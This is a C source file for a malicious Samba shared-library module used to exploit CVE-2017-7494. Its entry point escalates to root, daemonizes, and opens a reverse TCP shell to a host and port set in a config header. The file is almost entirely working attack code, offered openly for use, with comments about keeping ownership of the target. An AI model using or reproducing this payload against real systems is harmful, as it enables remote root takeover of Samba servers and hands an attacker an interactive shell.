//------------------------------------------------------------------------------
// SMB module to get root based on the original exploit published by @steelo 
// <knownsteelo@gmail.com> on exploit-db.com:
//
// https://www.exploit-db.com/exploits/42060/
//
// Portions based on the the exploit published by opsxcq in Github:
//
// https://github.com/opsxcq/exploit-CVE-2017-7494
//
// Reverse shell by @MrTuxracer (julien)
//
// https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/
//

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "config.h"

//------------------------------------------------------------------------------
extern bool change_to_root_user(void);

//------------------------------------------------------------------------------
// Shameless ripped out from:
//
// https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/
//
// Added external host, port and shell configuration using a header file (config.h).
//
void spawn_reverse_shell(void)
{
  int i; // used for dup2 later
  int sockfd; // socket file descriptor
  
  struct sockaddr_in srv_addr; // client address

  srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
  srv_addr.sin_port = htons(SHELL_PORT); // connect-back port, converted to network byte order
  srv_addr.sin_addr.s_addr = inet_addr(SHELL_HOST); // connect-back ip , converted to network byte order

  // create new TCP socket
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

  // connect socket
  connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

  // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
  for ( i = 0; i <= 2; i++ )
    dup2(sockfd, i);

  // magic
  execve(SHELL_BINARY, NULL, NULL);
}

//------------------------------------------------------------------------------
// Based on this payload https://github.com/opsxcq/exploit-CVE-2017-7494
// Instead of doing exit(EXIT_FAILURE), we just ignore and continue execution.
// It's better to still own even it detaching from the parent failed for some
// reason.
static void detach_from_parent(void)
{
  pid_t pid, sid;

  // Are we a Daemon ?
  if ( getppid() == 1 )
    return;

  // Fork from the parent
  pid = fork();
  // Bad PID ?
  if ( pid < 0 )
    return;
  
  // Our PID is OK, but we will exit if this is the parent process
  if ( pid > 0 )
    exit(0);

  // And continue this execution if we were the child process

  // Change our umask
  umask(0);

  // Create a new SID
  // Ref: http://man7.org/linux/man-pages/man2/setsid.2.html
  sid = setsid();
  if ( sid < 0 )
    return;

  // Let's move to / an directory that will always exist !
  if ( (chdir("/")) < 0 )
    return;
}

//------------------------------------------------------------------------------
// This is the Samba's expected entry point in the module. We could also use
// just the shared library's constructor, but it's better to play nice to smbd.
#if USE_OLD_ENTRYPOINT == 1
int init_samba_module(void)
#else
int samba_init_module(void)
#endif
{
  printf("Hello from the Samba module!\n");

  change_to_root_user();
  detach_from_parent();
  spawn_reverse_shell();

  // Exit without throwing any error
  return 0;
}
